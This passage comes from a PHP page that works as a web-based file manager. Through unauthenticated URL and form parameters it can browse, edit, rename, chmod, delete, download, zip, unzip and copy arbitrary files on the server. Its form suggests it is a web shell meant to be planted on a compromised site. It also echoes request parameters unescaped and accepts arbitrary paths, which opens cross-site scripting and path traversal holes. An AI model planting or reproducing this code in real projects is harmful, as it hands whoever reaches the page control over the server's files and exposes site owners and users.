			<td class="not mas sup">
				<span class="a">
					Filename
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<span><u><?=permission(cwd(),basename($file))?></u></span>
			</td>
		</tr>
		<tr>
			<td class="not mas">
				<span class="a">
					Size 
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<?=size($file)?>
			</td>
		</tr>
		<tr>
			<td class="not mas">
				<span class="a">
					Type
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<?=get_type($file)?>
			</td>
		</tr>
		<tr>
			<td class="not" colspan="3">
				<center>
					<a class="fo act acs c" href="?path=<?=cwd()?>" disable='disabled'>FILES</a>
					<?php
					$ext = pathinfo($file, PATHINFO_EXTENSION);
					switch ($ext) {
						case filetype($file) == 'file':
							if (is_dir($file)) {
								?><a class="fo act t" href="?path=<?=$file?>">OPEN</a><?php
							} elseif (is_file($file)) {
								?><a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a><?php
							}
							break;
					}
					?>
					<a class="fo slc fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
					<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
					<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
					<?php
					switch ($ext) {
						case filetype($file) == 'file':
							if (is_file($file)) {
								?>
								<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
								<?php
							}
							break;
					}
					?>
				</center>
			</td>
		</tr>
		<tr>
			<td class="not" colspan="3">
				<input class="action" type="text" name="newname" value="<?=basename($file)?>">
			</td>
		</tr>
		<tr>
			<td colspan="3">
				<input class="rename" type="submit" name="submit" value="RENAME">
			</td>
		</tr>
	</form>
	<?php
	exit();	
}
if (isset($_GET['edit'])) {
	$file = $_GET['file'];
	if (isset($_POST['submit'])) {
		if (edit($_GET['file'], $_POST['text'])) {
			$alert = alert("failed", "");
		} else {
			$alert = alert("success", "");
		}
	}
	?>
	<form method="post">
		<tr>
			<td class="not mas sup">
				<span class="a">
					Filename
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<span><u><?=permission(cwd(),basename($file))?></u></span>
			</td>
		</tr>
		<tr>
			<td class="not mas">
				<span class="a">
					Size 
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<?=size($file)?>
			</td>
		</tr>
		<tr>
			<td class="not mas">
				<span class="a">
					Type
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<?=get_type($file)?>
			</td>
		</tr>
		<tr>
			<td class="not" colspan="3">
				<center>
					<a class="fo act acs c" href="?path=<?=cwd()?>" disable='disabled'>FILES</a>
					<a class="fo slc act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
					<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
					<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
					<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
					<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
				</center>
			</td>
		</tr>
		<tr>
			<td class="not" colspan="3">
				<textarea class="edit" name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
				</textarea>
			</td>
		</tr>
		<tr>
			<td colspan="3">
				<input class="edit" type="submit" name="submit" value="EDIT">
			</td>
		</tr>
	</form>
	<?php
	exit();
}
  ?>
  <tbody>
  <form method="post" action="?path=<?=cwd()?>">
  <?php
  $scandir = scandir(cwd());
  	foreach ($scandir as $dir) {
  		if (!is_dir($dir) || $dir === '.')continue;
  			if ($dir === '..') {
  				?>
  				<?php
  				$back = "<td class='check'>
  							<label class='container'>
  							<input type='checkbox' onchange='checkAll(this)'>
  							<span class='checkmark'></span>
  							</label>
  						</td>
  						<td>
  							<a class='sa su' href='?path=".dirname(cwd())."'>
  							<img class='icon' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAQAAAD41aSMAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAD/h4/MvwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAuxJREFUeNrt3U1OG1EYRNFiO2QZwJIyC7bBWV6kwCpgAmIHZBAhkPixW0LqqvpujZlwjyyw3f365KfYmjsBAAAAGAAAMAAAYAAAwAAAgAEAAAMAAAYAAAwAABgAADAAAGAAAMAAAIABAAADAAAGAAAMAAAYAAAwAABgAADAAACAAQAAA0CS9nrWBoD18v+StHcmaAb4n1/eBL0Ar/kl6VpbANbLb0zQCfA+vy1BI8DH+SXpSjsA1stvSdAG8HV+Q4IugMP57QiaAI7Lb0bQA3B8fulRP3QPwHr5z/WXVwD5awCC8zcAROfPBwjPnw4Qnz8boCB/MkBF/lyAkvypAMvyn+nG91dJBCjKnwhQlT8PoCx/GkBd/iyAwvxJAJX5cwBK86cALMn/oPOc/BkAxfkTAKrz+wOU53cHqM/vDTAgvzPAiPy+AEPyuwKMye8JsCz/mW4lAMhfAjAsvxvAuPxeAAPzOwGMzO8DMDS/C8DY/B4Ag/M7AIzO7wBwqeujf/ZJF/oDAAR1f4QHE7j8GzqWwOeN2FACp48iRhJ4fRg3kMDt4+hxBH5fyAwjcPxKchSB55fygwhcL0sZQ+B7YdZGVxMInC9NHEHgfXHuAAL3y9PrCfxv0CgnSLhFqZog4ya9YoKU21RrCXJu1C4lSDqqoJIg67COQoK042rqCPIObNouOPk8gCDxyLIqgsxD+4oIUo+trCHIPbi1hCD56OIKguzDuwsI0o+vjyfIf4BDOEHDI0yiCToe4hNM0PIYq1iCnge57RY8rPZJp7oDYD2CS/3mFbAegVH+vsfZHiawyt/4QOevCTba8z5gPQK7/J0AnxEY5m8F+Ihgu+COAwC+ncA0fzPAWwLb/N0ALwS7BZeyAPDtBM/O+fsB7AcAAAAwAABgAADAAACAAQAAAwAABgAADAAAGAAAMAAAYAAAwAAAgAEAAAMAAAYAAAwAABgAADAAAGAAAMAAAIABAAADAAAGAAAMAADYgf0DnoxikFqb5rwAAAAASUVORK5CYII='>
  						</a>
  						</td>";
  			} else {
  				$dirs = cwd().'/'.$dir;
  				$back = "<td>
  							<label class='container'>
  							<input type='checkbox' name='data[]' value='{$dirs}'>
  							<span class='checkmark'></span>
  							</label>
  						</td>
  						<td>
  							<a class='sa su' href='?path=".cwd().'/'.$dir."'>".basename($dirs)."</a>
  						</td>";
  			} if ($dir === '.' || $dir === '..') {
  				$action = "<a class='sa si' href='?path=".cwd()."&action=path'>action</a>";
  			} else {
  				$action = '<a class="sa si" href="?path='.cwd().'&action&file='.cwd().'/'.$dir.'">action</a>';
  			}
  			?>
  			<tr>
  				<?=$back?>
  				<td class="pol">
  					<center>
  						<?= filetype(cwd().'/'.$dir) ?>
  					</center>
  				</td>
  				<td>
  					<center>
  						<?= $action ?>
  					</center>
  				</td>
  				<td class="perms">
  					<center>
  						<span class="k">
  							<?= permission($dir, perms($dir)) ?>
  						</span>
  					</center>
  				</td>
  			</tr>
  			<?php
  	}
  	foreach ($scandir as $file) {
  		if (is_file($file)) {
  			$files = cwd().'/'.$file;
  			?>
  			<tr class="file">
  				<td>
  					<label class='container'>
  						<input type='checkbox' name='data[]' value='<?=$files?>'>
  						<span class='checkmark'></span>
  				</td>
  				<td>
  					<a href='
  				<?php
  				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
  				if ($ext === 'png') {
  					print("?path=".cwd()."&act=img&file={$files}");
  				} elseif ($ext === 'jpg') {
  					print("?path=".cwd()."&act=img&file={$files}");
  				} elseif ($ext === 'ico') {
  					print("?path=".cwd()."&act=img&file={$files}");
  				} elseif ($ext === 'mp3') {
  					print("?path=".cwd()."&act=mp3&file={$files}");
  				} elseif ($ext === 'm4a') {
  					print("?path=".cwd()."&act=mp3&file={$files}");
  				} else {
  					print("?path=".cwd()."&action&file={$files}");
  				} ?>'><?=basename($files)?></a>
  				</td>
  				<td class="pol">
  					<center><?= filetype($files); ?></center>
  				</td>
  				<td class="perms">
  					<center>
  						<span class="k"><?= size($files); ?></span>
  					</center>
  				</td>
  				<td class="perms" colspan="2">
  					<center>
  						<span class="k">
  							<?= permission($files, perms($files)) ?>
  						</span>
  					</center>
  				</td>
  			</tr>
  			<?php
  		}
  	}
  ?>
<tr>
	<td class="not" colspan="3">
		<select name="mode" style="width:100%;">
			<option value="" selected>action</option>
			<option value="1">delete</option>
			<option value="2">zip</option>
			<option value="3">copy</option>
			<option value="5">backup</option>
			<option value="4">download</option>
			<?php
			foreach ($scandir as $file_zip) {
				if (is_file($file_zip)) {
					$ext = pathinfo($file_zip, PATHINFO_EXTENSION);
					switch ($ext) {
						case 'zip':
							?> <option value="unzip">Unzip ( <?=$file_zip?> )</option> <?php
							break;
						case 'rar':
							?> <option value="unzip">Unzip ( <?=$file_zip?> )</option> <?php
							break;
					}
				}
			}
			?>
		</select>
	</td>
	<td class="not">
		<input class="sad" type="submit" name="submit" value="execute">
	</td>
</tr>
</form>
<?php
if (isset($_POST['submit'])) {
	$data = $_POST['data'];
	foreach ($data as $key => $value) {
		switch ($_POST['mode']) {
			case '1':
				if (is_dir($value)) {
					if (delete($value)) {
						print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&delete=success&filename='.basename($value).'">');
					} else {
						print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&delete=failed&filename='.basename($value).'">');
					}
				} else {
					if (delete($value)) {
						alert("success", "Deleted <u>".basename($value)."</u> !");
					} else {
						alert("failed", "Deleted <u>".basename($value)."</u> !");
					}
				}
				break;
			case '2':
				if (zip(basename($value), cwd()."/".date("dmy_h-i").".zip")) {
					alert("success", "<u>".basename($value)."</u> to zip !");
				} else {
					alert("failed", "<u>".basename($value)."</u> to zip !");
				}
				break;
			case '3':
				print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&copi=file&filename='.$value.'">');
				break;
			case '4':
				download(basename($value));
				break;
			case '5':
				if (backup($value)) {
					header("Location: ?path=".cwd()."");
				}
				break;
			}
		}
	}
switch ($_POST['mode']) {
	case 'unzip':
		foreach ($scandir as $file_zip) {
			if (is_file($file_zip)) {
				$ext = pathinfo($file_zip, PATHINFO_EXTENSION);
				switch ($ext) {
					case 'zip':
						if (unzip($file_zip, cwd())) {
							print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&unzip=failed&filename='.$file_zip.'">');
						} else {
							print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&unzip=success&filename='.$file_zip.'">');
						}
						break;	
					case 'rar':
						$file_unzip = $file_zip;
						break;
				}
			}
		}
	break;
}
if ($_GET['copi'] == 'file') {
	$file = $_GET['filename'];
	$to = $_POST['to'];
	if (isset($_POST['submit'])) {
		if (copy($file, $to.'/'.basename($file))) {
			alert("success", "copied <u>".$file." to ".$to."</u>");
		} else {
			alert("failed", "copied <u>".$file." to ".$to."</u>");
		}
	}
	?>
	<form method="post">
		<tr>
			<td colspan="2" class="not cp">
				<input style="padding:7px;" class="action" type="text" name="" value="<?=basename($file)?>" readonly>
			</td>
			<td class="not">
				<input style="padding:7px 4px;" class="action" type="text" name="to" value="<?=cwd()?>">
			</td>
			<td class="not">
				<input style="margin-left:3.5px;" type="submit" name="submit">
			</td>
		</tr>
	</form>
	<?php

}
if ($_GET['unzip'] == 'success') {
	alert("success", "<u>".$_GET['filename']."</u> Unzip to <u>".cwd()."</u>");
} elseif ($_GET['unzip'] == 'failed') {
	alert("failed", "<u>".$_GET['filename']."</u> Unzip to <u>".cwd()."</u>");
}

if ($_GET['delete'] == 'success') {
	alert("success", "Deleted <u>".$_GET['filename']."</u>");
} elseif ($_GET['delete'] == 'failed') {
	alert("failed", "Deleted <u>".$_GET['filename']."</u>");
}
?>
<script type="text/javascript">
	function checkAll(ele) {
		var checkboxes = document.getElementsByTagName('input');
		if (ele.checked) {
			for (var i = 0; i < checkboxes.length; i++) {
				if (checkboxes[i].type == 'checkbox' ) {
					checkboxes[i].checked = true;
				}
           	}
       	} else {
           	for (var i = 0; i < checkboxes.length; i++) {
               	if (checkboxes[i].type == 'checkbox') {
                   	checkboxes[i].checked = false;
               	}
           	}
       	}
   	}
</script>
</tbody>
</table>
</center>
</body>
</html>
